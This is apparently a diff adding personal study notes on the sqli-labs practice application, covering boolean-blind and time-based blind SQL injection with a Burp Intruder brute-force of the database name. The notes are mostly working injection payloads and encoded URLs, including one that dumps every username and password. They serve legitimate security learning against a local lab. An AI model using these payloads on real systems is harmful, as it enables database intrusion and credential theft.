@@ -40,7 +40,24 @@ Show all username and password:
 localhost/sqli-labs-php7/Less-1/?id=-1' union select 1,group_concat(username SEPARATOR ', '), group_concat(password SEPARATOR ', ') from users --+
 
 OWASP A1 Pt4:
+Less-8 Blind SQL-->Check Ture(You are in):
+http://localhost/sqli-labs-php7/Less-8/?id=1' AND 1=1 --+
 
+MariaDB [mysql]> use security;
+MariaDB [security]> select substr(database(),1,1);
+MariaDB [security]> select ascii(substr(database(),1,1));
+Use Burp:
+id=1' AND (ascii(substr((select database()),1,1))) = ascii --+
+http://localhost/sqli-labs-php7/Less-8/?id=1%27%20AND%20(ascii(substr((select%20database()),1,1)))%20=%20ascii%20--+
+Sent to GET to Intruder, clear §; payload on §ascii§, payload type:Numbers 97-121,Step 1, 
+Then(115):
+GET /sqli-labs-php7/Less-8/?id=1%27%20AND%20(ascii(substr((select%20database()),1,1)))%20=%20115%20--+
 
+Less-9 Blind-Time based
+MariaDB [security]> select if ((select ascii(substr((select database()),1,1))) = 115, sleep(5), null);
 
+id=1' AND if((select ascii(substr((select database()),1,1))) = 115, sleep(5), null) --+
+http://localhost/sqli-labs-php7/Less-9/?id=1%27%20AND%20if((select%20ascii(substr((select%20database()),1,1)))%20=%20115,%20sleep(5),%20null)%20--+
+Like before:
+localhost/sqli-labs-php7/Less-9/?id=1' AND if((select ascii(substr((select database()),1,1))) = ascii, sleep(5), null) --+
 
